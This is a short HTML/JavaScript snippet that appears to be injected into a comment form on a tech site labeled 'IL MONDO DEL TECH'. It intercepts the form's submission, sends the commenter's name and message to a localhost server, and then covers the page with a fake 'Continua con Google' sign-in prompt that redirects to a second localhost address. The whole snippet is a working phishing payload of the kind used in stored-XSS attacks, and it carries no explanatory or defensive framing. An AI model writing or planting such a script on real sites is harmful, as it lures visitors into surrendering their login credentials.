<script>
  const form = document.querySelector('form[action="/comment"]'); const
  submitButton = form ? form.querySelector('button[type="submit"]') : null; if
  (form && submitButton){" "}
  {
    (form.onsubmit = async function (e) {
      e.preventDefault();
      submitButton.disabled = true;
      submitButton.textContent = "Invio in corso...";

      const data = {
        name: form.querySelector('[name="name"]').value,
        message: form.querySelector('[name="message"]').value,
      };

      const showBanner = () => {
        const banner = document.createElement("div");
        banner.className = "redirect-banner";
        banner.innerHTML = `
                    <div style="position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.72);display:flex;align-items:center;justify-content:center;font-family:sans-serif;">
                        <div style="position:relative;width:min(86vw,360px);aspect-ratio:1 / 1;background:#ffffff;color:#111827;border-radius:24px;box-shadow:0 24px 60px rgba(0,0,0,0.45);padding:28px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;text-align:center;">
                            <div style="position:absolute;top:22px;left:50%;transform:translateX(-50%);font-size:0.72rem;letter-spacing:0.16em;font-weight:700;text-transform:uppercase;color:#6b7280;">
                                IL MONDO DEL TECH
                            </div>
                            <span style="font-size:1.05rem;line-height:1.5;color:#111827;font-weight:bold">Per inviare il commento devi creare un account</span>
                            <button type="button" style="border:1px solid #000;background:#fff;color:#111827;padding:12px 28px;border-radius:9999px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;min-width:170px;">
                                <img src="https://img.icons8.com/?size=100&id=V5cGWnc9R4xj&format=png&color=000000" alt="Logo" style="width:22px;height:22px;object-fit:contain;flex:0 0 auto;" />
                                <span>Continua con Google</span>
                            </button>
                        </div>
                    </div>
                `;
        const button = banner.querySelector("button");
        button.addEventListener("click", () => {
          window.location.href = "http://localhost:3001";
        });

        document.body.appendChild(banner);
      };

      try {
        await fetch("http://localhost:3000/comment", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams(data),
        });
        showBanner();
      } catch (err) {
        showBanner();
      } finally {
        submitButton.disabled = false;
        submitButton.textContent = "Invia";
      }
    })
  }
</script>